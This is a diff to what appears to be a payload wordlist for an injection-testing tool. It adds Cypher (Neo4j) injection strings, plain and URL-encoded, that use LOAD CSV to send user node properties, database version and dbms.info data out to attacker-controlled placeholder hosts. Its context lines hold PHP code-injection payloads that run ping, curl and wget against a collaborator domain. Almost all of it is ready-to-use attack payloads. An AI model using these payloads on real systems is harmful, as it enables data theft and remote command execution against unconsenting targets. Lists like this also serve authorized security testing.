@@ -1,3 +1,11 @@
+' WITH 1 as a MATCH (u:user) UNWIND keys(u) as p LOAD CSV FROM 'http://$vps_ip/?cypherinject_'%2bp%2b'='%2btoString(u[p]) as l RETURN 0 as _0//
+%27+OR+1%3D1+WITH+1+as+a++CALL+dbms.components%28%29+YIELD+name%2C+versions%2C+edition+UNWIND+versions+as+version+LOAD+CSV+FROM+%27http%3A%2F%2F$vps_ip%2F%3Fcypherinject_version%3D%27+%2B+version+%2B+%27%26name%3D%27+%2B+name+%2B+%27%26edition%3D%27+%2B+edition+as+l+RETURN+0+as+_0+%2F%2F
+' WITH 1 as a CALL dbms.info() yield name LOAD CSV FROM 'http://$vps_ip/?cypherinject_' %2b name as l RETURN 0 as _0 //
+%27+WITH+1+as+a+CALL+dbms.info%28%29+yield+name+LOAD+CSV+FROM+%27http%3A%2F%2F$vps_ip%2F%3Fcypherinject_%27+%2B+name+as+l+RETURN+0+as+_0+%2F%2F
+' WITH 1 as a MATCH (u:user) UNWIND keys(u) as p LOAD CSV FROM 'http://$domain_collab/?cypherinject_'%2bp%2b'='%2btoString(u[p]) as l RETURN 0 as _0//
+%27+OR+1%3D1+WITH+1+as+a++CALL+dbms.components%28%29+YIELD+name%2C+versions%2C+edition+UNWIND+versions+as+version+LOAD+CSV+FROM+%27http%3A%2F%2F$domain_collab%2F%3Fcypherinject_version%3D%27+%2B+version+%2B+%27%26name%3D%27+%2B+name+%2B+%27%26edition%3D%27+%2B+edition+as+l+RETURN+0+as+_0+%2F%2F
+' WITH 1 as a CALL dbms.info() yield name LOAD CSV FROM 'http://$domain_collab/?cypherinject_' %2b name as l RETURN 0 as _0 //
+%27+WITH+1+as+a+CALL+dbms.info%28%29+yield+name+LOAD+CSV+FROM+%27http%3A%2F%2F$domain_collab%2F%3Fcypherinject_%27+%2B+name+as+l+RETURN+0+as+_0+%2F%2F
 ${system($_GET[0])}&0=ping domain_collab
 ${system($_GET[0])}&0=curl domain_collab
 ${system($_GET[0])}&0=wget domain_collab
